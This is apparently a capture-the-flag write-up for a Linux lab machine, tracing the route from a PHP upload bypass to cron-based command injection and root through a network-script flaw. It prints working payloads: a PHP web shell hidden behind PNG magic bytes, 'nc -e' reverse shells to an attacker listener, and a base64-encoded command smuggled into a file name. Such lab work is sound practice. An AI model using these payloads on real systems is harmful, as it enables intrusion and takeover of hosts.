Main steps
1. Fuzz site to find source code
2. Upload obfuscated PHP reverse shell to server to gain shell access
3. Enumerate user's home directory to find `cron` job and script
4. Enumerate script to find out how it works
5. Command injection in script
6. Gain shell access as user
7. Enumerate `sudo -l` for `sudo` script
8. Run `sudo` script and inject commands to privilege escalate

Learning points
1. Need to read through scripts properly to know what they are trying to do
2. Filenames in Linux do not accept forward slashes, but this can be bypassed by using `base64` if present
3. Remember to enumerate user's home directory
4. If scripts don't seem to be vulnerable, just try running them with some weird arguments to see what happens

`nmap`
![[Pasted image 20260311014154.png]]

`Whatweb` shows PHP version 5.4.16

Checking the site's source code shows a comment about an upload and gallery page
![[Pasted image 20260311020512.png]]

`Feroxbuster` showed a directory `/backup/backup.tar` - navigating here downloads a `backup.tar` file. `/uploads` returns a blank page.
![[Pasted image 20260311020759.png]]

Unzipping this file shows a few PHP files
![[Pasted image 20260311021009.png]]

`index.php` is the static page we see when navigating to the site.

`photos.php` seems to display photos from `/var/www/html/uploads`. Navigating to the page on the site shows this
![[Pasted image 20260311021136.png]]

`upload.php` seems to be an upload page that takes a file with either `.jpg, .png, .gif, or .jpeg` extensions, then uploads it to `/var/www/html/uploads/` and changes its permissions to 0644, which is `rw-r--r--`. Navigating to the page shows the upload form.
![[Pasted image 20260311021451.png]]

As a quick test, I tried to upload a double extension PHP reverse shell file. While the file is able to be uploaded, navigating to the link doesn't seem to run the file.
![[Pasted image 20260311021753.png]]
![[Pasted image 20260311021745.png]]

`lib.php`, the last PHP file in the `backup`, seems to be a function file that the other 2 call with `require`. Nothing much interesting here, just some functions to process the file upload.

Trying to upload a shell again with `echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > simplephpshell.php.png`and navigating to it seems to work. The output for `http://10.129.232.206/uploads/10_10_14_77.php.png?cmd=whoami` shows `apache`.
![[Pasted image 20260311022454.png]]

Tried a few reverse shell commands and was able to get one with `nc -e`.
![[Pasted image 20260311022654.png]]

`python` was not installed on the server but `socat` was, so I upgraded to an interactive shell with that.
![[Pasted image 20260311022813.png]]

`cat /etc/passwd` shows a user named `guly`.
![[Pasted image 20260311023003.png]]

Server seems pretty bare, but checking `ss -ntplu` shows that the localhost is listening on port 25, which is the `SMTP` port.
![[Pasted image 20260311023227.png]]

Running `nc` on the port shows the version number as `Sendmail 8.14.7`
![[Pasted image 20260311023327.png]]

Googling this version does not seem to shows anything other than an SMTP smuggling vulnerability, which is not relevant here.

`sudo -l` requires a password which we do not have.

Checking the `SUID` binaries shows a few interesting things - `crontab` has its `SUID` bit set, as well as `usernetctl`, which is used to manage network interfaces. However, there does not seem to be any way to exploit these at the moment.

Checking the `/home` directory for the user `guly` shows a few interesting files - a `crontab.guly` file, which runs the `/home/guly/check_attack.php` file every 3 minutes.
![[Pasted image 20260311030702.png]]

Enumerating the `check_attack.php` file shows that it imports the `lib.php` file. The script seems to check for files being uploaded to the `/uploads` directory, and if they meet some condition they will be logged and the file will be mailed to `guly`.

These 2 lines in the PHP script are interesting as they execute system commands.
![[Pasted image 20260311031546.png]]

By injecting values into any of the 3 variables here, I could run whatever command I want. `$logpath` and `$path` are both statically set in the PHP file, so `$value` is the only variable that can be used.

Reading the PHP code, the first part seems to create an array named `$files`, and append all files in` $path = '/var/www/html/uploads/'` to the array. Googling the pattern shown there shows that it matches any file that does not start with a `.`.
![[Pasted image 20260311031757.png]]
![[Pasted image 20260311031959.png]]

The script then iterates over each item, using the array index as the `$key` and the file name as the `$value`. It ignores `index.html`, then passes `$value` to `getnameCheck()`. This is a function in `lib.php` that splits the filename into its name and extension.
![[Pasted image 20260311032132.png]]

The script then passes the `$name` and `$value` to `check_ip()`, which is a function in `lib.php` that passes the `$name` to `FILTER_VALIDATE_IP` which is a PHP function that checks if the string is a valid IP address. If it is not, it sets `$ret` to false.
![[Pasted image 20260311032252.png]]

The last part of the script only executes if the `$check[0]` is false, which is the `$ret` value of `check_ip()`. This means that if a file's name is not a valid IP address, this part of the code executes, and the line `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` will end up running with the file's name in $value.
![[Pasted image 20260311032513.png]]

This means that I can create any file in the `/var/www/html/uploads` directory and give it a name with any command, and this script should execute it.

e.g. a file named `test; touch testfile;` should execute `nohup /bin/rm -f /var/www/html/uploads test; touch testfile; > /dev/null 2>&1 &` and create a file named `testfile` in the working directory.

Tried to create a file named `test; nc -e /bin/bash 10.10.14.77 6666; test` but was unable to. A quick search shows that the Linux filesystem does not accept forward slashes in file names. Since every command will require at least one forward slash to execute, I will need to find a workaround to this.

Searching for a workaround gave this: it is possible to `echo` `base64` encoded strings to `base64` and decode it in the command line, then pipe the output to `sh`. (https://askubuntu.com/questions/178521/how-can-i-decode-a-base64-string-from-the-command-line) Checking `which base64` shows that this tool is available on the machine.
![[Pasted image 20260311033419.png]]

Tried running `echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0Ljc3IDY2NjY= | base64 --decode | sh` in the terminal and was able to get a reverse shell. The base64 encoded string is the `nc` reverse shell payload.

Created the file using `touch "test; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0Ljc3IDY2NjY= | base64 --decode | sh; test"` and waited for the `cron` job to execute to try and get a shell as `guly`.
![[Pasted image 20260311033753.png]]

At the third minute, I received a connection on my listener, and got a shell as `guly`.
![[Pasted image 20260311034101.png]]

Upgraded the shell with `socat` again.

Enumerating `sudo -l` shows that `guly` and run a script as root.
![[Pasted image 20260311034235.png]]

Examining the script shows that it adds some test to the end of the file `/etc/sysconfig/network-scripts/ifcfg-guly`, then declares a `regex` expression that matches uppercase and lowercase letters, digits, underscores, spaces, forward slashes, and hyphens. Then it takes `NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO`, which are the standard settings in the Linux network interface configuration file, and iterates over them, echoing the interface. Then it reads input from the user and checks if it matches the `regex` declared above. If it matches, it echoes  `$var`= `user input` into a file, then brings up the `guly0` interface.
![[Pasted image 20260311034250.png]]

Seems like it might be possible to inject commands into the `$x` variable. However, the `regex` prohibits semicolons from being used. Doesn't seem to be any way to bypass the filter to chain commands.

I ran the script a few times to test it out to see if anything happens. First off, the interface is never brought up since it does not exist.

I noticed that if a space is added to the input, the script gives an error message stating that the command is not found.
![[Pasted image 20260311041121.png]]

Since this seemed quite interesting, I tried to run some commands by passing `value command` to each input. Surprisingly, the commands were all executed.
![[Pasted image 20260311041313.png]]
![[Pasted image 20260311041325.png]]

Since the commands seemed to be running as root, (note the `id` above), I re-ran the script with `test su root` in the  inputs and got a root shell.
![[Pasted image 20260311041543.png]]

This is due to an error reported here https://seclists.org/fulldisclosure/2019/Apr/24, where any value after a space in a network script with the format `VARIABLE=value` will be executed for `CentOS` and `Redhat` systems.